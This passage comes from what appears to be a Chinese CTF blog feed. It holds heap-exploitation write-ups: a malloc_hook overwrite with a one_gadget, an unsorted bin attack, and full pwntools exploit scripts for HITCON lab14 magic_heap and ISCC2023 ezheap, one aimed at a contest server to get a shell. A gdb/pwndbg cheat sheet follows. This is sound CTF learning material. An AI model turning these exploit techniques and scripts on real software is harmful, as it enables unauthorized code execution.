data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.14zzpmo4hk2k.png"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.2osyb6pm2mg0.png"></p><blockquote><p>​    可以看到既然fake_chunk已经被挂进fastbin了，所以我们只需要再次申请两个size为0x70大小的chunk。申请第一个0x70的chunk重启chunk7，申请第二个0x70的chunk将fake_chunk作为正常chunk启用：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Allocate(0x60)</span><br><span class="line">Allocate(0x60)</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.17s14q8hd2e8.png"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.69w261jg8ts0.png"></p><h5 id="控制fake-chunk，通过one-gadget从而getshell！"><a href="#控制fake-chunk，通过one-gadget从而getshell！" class="headerlink" title="控制fake_chunk，通过one_gadget从而getshell！"></a>控制fake_chunk，通过one_gadget从而getshell！</h5><blockquote><p>​    那么的到one_gadget了之后，就可以调用程序本身Fill()函数，向id为6的fake_chunk中的malloc_hook地址位置写one_gadget了。那么malloc_hook相对于fake_chunk的内容起始位置的偏移为0x13，所以构建payload_for_hook及交互代码：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">one_gadget_addr = libcbase + 0x4526a</span><br><span class="line">payload = 0x13 * b&#x27;a&#x27; + p64(one_gadget_addr)</span><br><span class="line">Fill(6, payload)</span><br></pre></td></tr></table></figure><p>​    <strong>————-》<code>0x13</code>怎么得来的呢？</strong></p><p>​        根据前面的计算malloc_hook相对fake_chunk的偏移为<code>0x23</code>，也就是说去掉fake_chunk的prev_size和size，malloc_hook的起始位置相对于fake_chunk数据区域起始地址的偏移为<code>0x13</code>。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.1mxf8wyadw8w.png"></p><p><img lazyload alt="image" data-src="/home/c2yb8er/Typora/images/image-20230506231523491.png"></p><blockquote><p>​    这样一来，malloc_hook中就被安置好了，只需要调用程序中的allocate()函数创建任意大小的chunk，就可以触发one_gadget拿shell！！！</p></blockquote><p>​    我还没有完全搞懂修改malloc_hook的基理，上述整个流程虽然都理解了，但是较为生疏！多模多练！</p><blockquote><p>​    在这种情况下，如果成功将one_gadget地址写入到<code>malloc_hook</code>位置，那么当下一次调用<code>malloc</code>函数时，它将会尝试执行<code>malloc_hook</code>指向的地址，即one_gadget。</p><h3 id="malloc-hook："><a href="#malloc-hook：" class="headerlink" title="malloc_hook："></a>malloc_hook：</h3><p>​    位于 libc 中的函数指针变量，通常为 NULL，不为 NULL 时 malloc() 函数会优先调用该函数指针</p><p>​    在GNU C库（glibc）中，<code>malloc_hook</code>是一个指向用户定义的函数的指针，它允许用户在调用标准库函数<code>malloc</code>时进行自定义的操作。<code>malloc_hook</code>被定义为全局变量，其初始值为<code>NULL</code>。</p><p>​    当调用<code>malloc</code>函数时，glibc会先检查<code>malloc_hook</code>的值。如果<code>malloc_hook</code>不为<code>NULL</code>，则在执行实际的内存分配操作之前，会先调用<code>malloc_hook</code>指向的函数。这个函数可以被用户自定义，可以执行一些特定的操作，例如记录内存分配信息、添加额外的内存检查等。</p></blockquote><h5 id="不知道为什么远程通了，本地没通"><a href="#不知道为什么远程通了，本地没通" class="headerlink" title="不知道为什么远程通了，本地没通"></a>不知道为什么远程通了，本地没通</h5><p>​    本地照理说应该是可以打通的，但是system函数卡在了某个位置上：</p><p><img lazyload alt="image" data-src="/home/c2yb8er/Typora/images/image-20230506232256781.png"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230506/c2yb8erimage.69ypvhttvk40.png"></p><h1 id="Unsorted-Bin-Attack"><a href="#Unsorted-Bin-Attack" class="headerlink" title="Unsorted Bin Attack"></a>Unsorted Bin Attack</h1><blockquote><h3 id="Unsorted-Bin基本来源"><a href="#Unsorted-Bin基本来源" class="headerlink" title="Unsorted Bin基本来源"></a>Unsorted Bin基本来源</h3><ol><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，并且<strong>该 chunk 不和 top chunk 紧邻时</strong>，该 chunk 会被首先放到 unsorted bin 中。</li><li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。</li></ol><h3 id="Unsorted-Bin基本使用情况"><a href="#Unsorted-Bin基本使用情况" class="headerlink" title="Unsorted Bin基本使用情况"></a>Unsorted Bin基本使用情况</h3><ol><li><p>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</p></li><li><p>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。<br><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230507/c2yb8erimage.1m0mv03x6nc0.png"></p><h3 id="Unsorted-Bin-Attack-原理"><a href="#Unsorted-Bin-Attack-原理" class="headerlink" title="Unsorted Bin Attack 原理"></a>Unsorted Bin Attack 原理</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>​    即是如果我们控制了 bk 的值，我们就能将 <code>unsorted_chunks (av)</code> 写到任意地址</p></li></ol></blockquote><h2 id="0x0-HITCON-Training-lab14-magic-heap"><a href="#0x0-HITCON-Training-lab14-magic-heap" class="headerlink" title="0x0.HITCON Training lab14 magic_heap"></a>0x0.HITCON Training lab14 magic_heap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">c = process(&#x27;/home/c2yb8er/下载/Heap/Unsorted heap/easyheap/easyheap2.23&#x27;)</span><br><span class="line"># c = remote(&#x27;node4.buuoj.cn&#x27;,27786)</span><br><span class="line">elf = ELF(&#x27;/home/c2yb8er/下载/Heap/Unsorted heap/easyheap/easyheap2.23&#x27;)</span><br><span class="line">libc = ELF(&#x27;/home/c2yb8er/Binary/libcs/16X64&#x27;)</span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line"># context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def Create(size,content):</span><br><span class="line">    c.recvuntil(b&#x27;Your choice :&#x27;)</span><br><span class="line">    c.send(b&#x27;1&#x27;)</span><br><span class="line">    c.recvuntil(b&#x27;Size of Heap : &#x27;)</span><br><span class="line">    c.send(str(size))</span><br><span class="line">    c.recvuntil(b&#x27;Content of heap:&#x27;)</span><br><span class="line">    c.send(content)</span><br><span class="line"></span><br><span class="line">def Edit(idx,size,content):</span><br><span class="line">    c.recvuntil(b&#x27;Your choice :&#x27;)</span><br><span class="line">    c.send(b&#x27;2&#x27;)  </span><br><span class="line">    c.recvuntil(b&#x27;Index :&#x27;)  </span><br><span class="line">    c.send(str(idx))</span><br><span class="line">    c.recvuntil(b&#x27;Size of Heap : &#x27;)</span><br><span class="line">    c.send(str(size))</span><br><span class="line">    c.recvuntil(b&#x27;Content of heap : &#x27;)</span><br><span class="line">    c.send(content)</span><br><span class="line"></span><br><span class="line">def Delete(idx):</span><br><span class="line">    c.recvuntil(b&#x27;Your choice :&#x27;)</span><br><span class="line">    c.send(b&#x27;3&#x27;)  </span><br><span class="line">    c.recvuntil(b&#x27;Index :&#x27;)  </span><br><span class="line">    c.send(str(idx))    </span><br><span class="line"></span><br><span class="line">magic = 0x6020C0</span><br><span class="line">Create(0x18, &#x27;a&#x27;) #0</span><br><span class="line">Create(0x88, &#x27;b&#x27;) #1</span><br><span class="line">Create(0x18, &#x27;c&#x27;) #2</span><br><span class="line"></span><br><span class="line">Delete(1)</span><br><span class="line">payload = b&#x27;a&#x27; * 0x10 + p64(0) + p64(0x91) + p64(0) + p64(magic - 0x10) </span><br><span class="line">Edit(0, len(payload), payload)</span><br><span class="line"></span><br><span class="line">Create(0x88, &#x27;d&#x27;) # 为什么再次create一个chunk就能直接修改了？</span><br><span class="line"></span><br><span class="line">c.sendlineafter(&quot;Your choice :&quot;, &quot;4869&quot;)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x1-ISCC2023-擂台赛第一题-ezheap"><a href="#0x1-ISCC2023-擂台赛第一题-ezheap" class="headerlink" title="0x1.ISCC2023_擂台赛第一题:ezheap"></a>0x1.ISCC2023_擂台赛第一题:ezheap</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="type">int</span> idx_1; <span class="comment">// [rsp+100h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> idx_0; <span class="comment">// [rsp+104h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+108h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+114h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> idx; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> choice; <span class="comment">// [rsp+11Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    choice = menu();</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">5</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        idx = get_idx();</span><br><span class="line">        size = get_size();</span><br><span class="line">        ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !ptr )</span><br><span class="line">          die(<span class="string">&quot;malloc error&quot;</span>);</span><br><span class="line">        ptrs[idx] = ptr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        idx_0 = get_idx();</span><br><span class="line">        <span class="built_in">free</span>(ptrs[idx_0]);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;unimplemented yet&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>: <span class="comment">// &lt;-------edit函数，由于没有检测chunk是否被释放我们下文可以在这里作文章</span></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;unimplemented yet&quot;</span>);</span><br><span class="line">        idx_1 = get_idx();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;input content plz : &quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( read(<span class="number">0</span>, ptrs[idx_1], <span class="number">16uLL</span>) &lt; <span class="number">0</span> )</span><br><span class="line">          die(<span class="string">&quot;read error&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wrong choice&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( magics[<span class="number">255</span>] &gt; <span class="number">0x7F0000000000</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input your key&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    check_key(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">check_key</span><span class="params">(<span class="type">char</span> *input)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">15</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(buf, input, <span class="number">0x100</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __cdecl <span class="title function_">door</span><span class="params">()</span>  <span class="comment">//焯，原来直接有现成的，我直接ROP麻烦了一丢丢。</span></span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="简单说一下思路："><a href="#简单说一下思路：" class="headerlink" title="简单说一下思路："></a>简单说一下思路：</h3><ol><li><p>新建三个chunk(一般是这样)：其中第一chunk用来溢出修改chunk2，第二个chunk用来攻击，第三个chunk用来隔绝top chunk。</p><p>但是由于这道题的特殊性，因为edit函数并没有检查chunk是否被释放，所以我们不需要通过chunk1来修改chunk2而是直接通过chunk2本身进行修改！于是新建两个chunk就足够：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">------------------------------------------</span><br><span class="line">pre | size  </span><br><span class="line">fd  | bk &lt;---chunk1</span><br><span class="line">content</span><br><span class="line">------------------------------------------</span><br><span class="line">pre | size  </span><br><span class="line">fd  | bk &lt;---chunk2</span><br><span class="line">content</span><br><span class="line">------------------------------------------</span><br><span class="line">Top chunk</span><br></pre></td></tr></table></figure></li><li><p>释放chunk1后，修改其bk指针为<code>magics[255]</code>的地址</p></li><li><p>重新申请一个chunk即可。</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"># c = process(&#x27;/home/c2yb8er/下载/ISCC2023/擂台赛第一题/heap2.23&#x27;)</span><br><span class="line">c = remote(&quot;59.110.164.72&quot;,10022)</span><br><span class="line">elf = ELF(&#x27;/home/c2yb8er/下载/ISCC2023/擂台赛第一题/heap2.23&#x27;)</span><br><span class="line"># libc = ELF(&#x27;/home/c2yb8er/Binary/libcs/16X64&#x27;)</span><br><span class="line">context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(idx):</span><br><span class="line">    c.recvuntil(b&#x27;input your choice : &#x27;)</span><br><span class="line">    c.send(b&#x27;1&#x27;)</span><br><span class="line">    c.recvuntil(b&#x27;input idx plz : &#x27;)</span><br><span class="line">    c.send(str(idx))</span><br><span class="line">    c.recvuntil(b&#x27;input size plz : &#x27;)</span><br><span class="line">    c.send(b&#x27;129&#x27;)</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">    c.recvuntil(b&#x27;input your choice : &#x27;)</span><br><span class="line">    c.send(b&#x27;4&#x27;)</span><br><span class="line">    c.recvuntil(b&#x27;input idx plz : &#x27;)</span><br><span class="line">    c.send(str(idx))</span><br><span class="line">    c.recvuntil(b&#x27;input content plz : &#x27;)</span><br><span class="line">    c.send(content)</span><br><span class="line"></span><br><span class="line">def rm(idx):</span><br><span class="line">    c.recvuntil(b&#x27;input your choice : &#x27;)</span><br><span class="line">    c.send(b&#x27;2&#x27;)</span><br><span class="line">    c.recvuntil(b&#x27;input idx plz : &#x27;)</span><br><span class="line">    c.send(str(idx))</span><br><span class="line"></span><br><span class="line">bin_sh = 0x400C86</span><br><span class="line">system_addr = elf.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line"># for i in range(30):</span><br><span class="line">#     add(i)</span><br><span class="line"></span><br><span class="line">add(0)</span><br><span class="line">add(1)</span><br><span class="line">rm(0)</span><br><span class="line"></span><br><span class="line">edit(0,p64(0) + p64(0x6029b0-0x8))</span><br><span class="line"></span><br><span class="line">add(2)</span><br><span class="line"></span><br><span class="line">c.send(b&#x27;5&#x27;)</span><br><span class="line"># gdb.attach(c)</span><br><span class="line"># pause()</span><br><span class="line">pop_rdi_ret = 0x400bf3</span><br><span class="line">payload = b&#x27;a&#x27;*0x18 + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr)</span><br><span class="line">c.recvuntil(b&#x27;input your key\n&#x27;)</span><br><span class="line">c.send(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwn工具指北</title>
      <link href="/2023/03/05/0_PWN/Pwngdb%E6%8C%87%E5%8D%97/"/>
      <url>/2023/03/05/0_PWN/Pwngdb%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Instructions For Pwn tools</p></blockquote><span id="more"></span><h2 id="0x0-gdb命令"><a href="#0x0-gdb命令" class="headerlink" title="0x0.gdb命令"></a>0x0.gdb命令</h2><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>gdb -q [file] -d [path]</td><td>带源码调试</td></tr><tr><td>b *address/function_name</td><td>下断点</td></tr><tr><td>r</td><td>运行</td></tr><tr><td>c</td><td>继续</td></tr><tr><td>ni</td><td>执行下一条指令（不会进入函数）</td></tr><tr><td>si</td><td>执行下一条指令（如果是函数，进入函数执行）</td></tr><tr><td>vmmap</td><td>打印链接库</td></tr><tr><td>libc</td><td>输出libc_base</td></tr><tr><td>heap/parseheap</td><td>查看堆</td></tr><tr><td>bin</td><td>查看bins</td></tr><tr><td>x /nxg address</td><td>查看address处的内存</td></tr><tr><td>p address</td><td>打印地址/指针</td></tr><tr><td>stack length</td><td>查看栈</td></tr><tr><td>telescope address</td><td>查看地址</td></tr><tr><td>hex address</td><td>查看hex</td></tr><tr><td>fmtarg</td><td>格式化字符串偏移地址</td></tr></tbody></table><h2 id="0x1-求偏移"><a href="#0x1-求偏移" class="headerlink" title="0x1.求偏移"></a>0x1.求偏移</h2><h3 id="1-cyclic"><a href="#1-cyclic" class="headerlink" title="1.cyclic"></a>1.cyclic</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cyclic 200 / 足够栈溢出的数字</span><br><span class="line"></span><br><span class="line">gdb -f xxx </span><br><span class="line"></span><br><span class="line">输入cyclic生成的字符串</span><br><span class="line"></span><br><span class="line">gdb报错信息中BACKTRACE所指向的地址</span><br><span class="line"></span><br><span class="line">cyclic -l 指向地址</span><br></pre></td></tr></table></figure><h2 id="0x2-修改库"><a href="#0x2-修改库" class="headerlink" title="0x2.修改库"></a>0x2.修改库</h2><ol><li><p>将需要修改的库的程序放到<code>tools</code>目录下</p></li><li><p>使用命令<code>patchup 程序名 库版本 -b</code>，例如：<code>patchup 65 2.27 -b</code></p></li><li><p>修改成功，复制回去。</p></li><li><p>索引从<code>0</code>开始。</p></li></ol><h2 id="0x3-用户代码片段"><a href="#0x3-用户代码片段" class="headerlink" title="0x3.用户代码片段"></a>0x3.用户代码片段</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># gdb</span><br><span class="line">&#123;</span><br><span class="line">&quot;fgdb&quot;: &#123;</span><br><span class="line">&quot;scope&quot;: &quot;python&quot;,</span><br><span class="line">&quot;prefix&quot;: &quot;fgdb&quot;,</span><br><span class="line">&quot;body&quot;: [</span><br><span class="line">&quot;gdb.attach(c)&quot;,</span><br><span class="line">&quot;pause()&quot;</span><br><span class="line">],</span><br><span class="line">&quot;description&quot;: &quot;GDB FAST!&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"># pwn</span><br><span class="line">&#123;</span><br><span class="line">&quot;pwn&quot;: &#123;</span><br><span class="line">&quot;scope&quot;: &quot;python&quot;,</span><br><span class="line">&quot;prefix&quot;: &quot;pwn&quot;,</span><br><span class="line">&quot;body&quot;: [</span><br><span class="line">&quot;from pwn import *&quot;,</span><br><span class="line">&quot;c = process(&#x27;/home/c2yb8er/Binary/pwn/BUU/72&#x27;)&quot;,</span><br><span class="line">&quot;# c = remote(&#x27;node4.buuoj.cn&#x27;,29877)&quot;,</span><br><span class="line">&quot;elf = ELF(&#x27;/home/c2yb8er/Binary/pwn/BUU/72&#x27;)&quot;,</span><br><span class="line">&quot;# libc = ELF(&#x27;/home/c2yb8er/Binary/libcs/18X64&#x27;)&quot;,</span><br><span class="line">&quot;context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]&quot;,</span><br><span class="line">&quot;context.arch = &#x27;amd64&#x27;&quot;,</span><br><span class="line">&quot;# context.log_level = &#x27;debug&#x27;&quot;,</span><br><span class="line">&quot;c.interactive()&quot;,</span><br><span class="line">],</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x4-Heap指令"><a href="#0x4-Heap指令" class="headerlink" title="0x4.Heap指令"></a>0x4.Heap指令</h2><ul><li><p><code>arena</code> //显示arena的详细信息</p><ul><li><code>arenas</code> //显示所有arena的基本信息</li><li><code>arenainfo</code> //<strong>好看的显示</strong>所有arena的信息</li></ul></li><li><p><code>bins</code> //</p><p>常用，查看所有种类的堆块的链表情况</p><ul><li><code>fastbins</code> //单独查看fastbins的链表情况</li><li><code>largebins</code> //同上，单独查看largebins的链表情况</li><li><code>smallbins</code> //同上，单独查看smallbins的链表情况</li><li><code>unsortedbin</code> //同上，单独查看unsortedbin链表情况</li><li><code>tcachebins</code> //同上，单独查看tcachebins的链表情况</li><li><code>tcache</code> //查看tcache详细信息</li></ul></li><li><p><code>heap</code> //</p><p>数据结构的形式显示所有堆块，会显示一大堆</p><ul><li><code>heapbase</code> //<strong>查看堆起始地址</strong></li><li><code>heapinfo</code>、<code>heapinfoall</code> //显示堆的信息，和bins的挺像的，<strong>没bins好用</strong></li><li><code>parseheap</code> //显示堆结构，<strong>很好用</strong></li></ul></li><li><p><code>tracemalloc</code> //<strong>好用</strong>，会跟提示所有操作堆的地方</p></li></ul><h2 id="0x5-查看libc-so-6的版本"><a href="#0x5-查看libc-so-6的版本" class="headerlink" title="0x5.查看libc.so.6的版本"></a>0x5.查看libc.so.6的版本</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings libc.so.6 |grep GNU</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwnable.kr</title>
      <link href="/2023/02/06/0_PWN/pwnable-kr/"/>
      <url>/2023/02/06/0_PWN/pwnable-kr/</url>
      
